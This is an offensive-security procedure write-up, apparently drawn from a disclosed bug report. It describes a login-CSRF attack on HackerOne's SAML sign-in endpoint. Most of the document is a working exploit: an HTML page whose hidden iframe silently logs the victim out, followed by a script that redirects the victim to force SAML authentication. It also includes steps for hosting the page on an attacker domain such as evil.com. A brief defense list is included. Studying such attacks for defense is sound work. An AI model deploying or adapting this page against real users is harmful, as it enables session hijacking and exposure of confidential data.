---
tags:
  - csrf
  - saml
  - login-csrf
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: ee6bd301-705d-4c2c-adeb-ab7b6f5c213d
created_at: '2025-12-14T17:27:57.227Z'
updated_at: '2025-12-14T17:27:57.227Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
---
# Perform-Login-CSRF-with-Malicious-HTML

## Summary

This procedure creates a malicious HTML page to exploit Login CSRF in SAML SSO flows, forcing passwordless account authentication by initiating the login without user consent or CSRF protection.

## Description

In HackerOne's SAML implementation, the /users/saml/sign_in endpoint accepts GET requests with email and remember_me parameters without CSRF tokens, allowing attackers to force IdP-initiated SSO. The procedure involves embedding an invisible iframe to clear the victim's session (logout) and using JavaScript to redirect to the vulnerable endpoint, enabling session hijacking and access to confidential areas like bug reports.

## Requirements

1. Victim's email address
2. Attacker-controlled domain to host the HTML
3. Target SAML SSO endpoint (e.g., https://hackerone.com/users/saml/sign_in)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all login initiation endpoints
- Require POST for sensitive actions like login
- Monitor for unusual SAML initiations from external sources

## Objectives

1. Force victim authentication without interaction
2. Hijack session for information leakage
3. Enable chaining to other exploits

## Instructions

### Step 1: Create the Malicious HTML Structure

**Context**: Build the base HTML with a hidden iframe to load the logout endpoint, ensuring the victim's session is cleared before forcing new login.

Create the following HTML file (save as csrf.html):

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<iframe src="https://hackerone.com/users/sign_out" style="width:0;height:0;border:0;"></iframe>
<script>
setTimeout(function() {
  window.location.href = 'https://hackerone.com/users/saml/sign_in?email=victim@example.com&remember_me=true';
}, 5000);
</script>
</body>
</html>
```

> The iframe loads the logout silently. After 5 seconds, JS redirects to SAML sign-in with victim's email, initiating flow without checks.

### Step 2: Host and Test the Page

**Context**: Deploy the HTML on a server and verify it triggers the SAML flow in a test environment.

Upload to attacker domain (e.g., evil.com/csrf.html) and visit in browser with target cookies. Observe redirect to IdP.

> Expected: Browser authenticates via SAML as victim if passwordless.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[saml]]
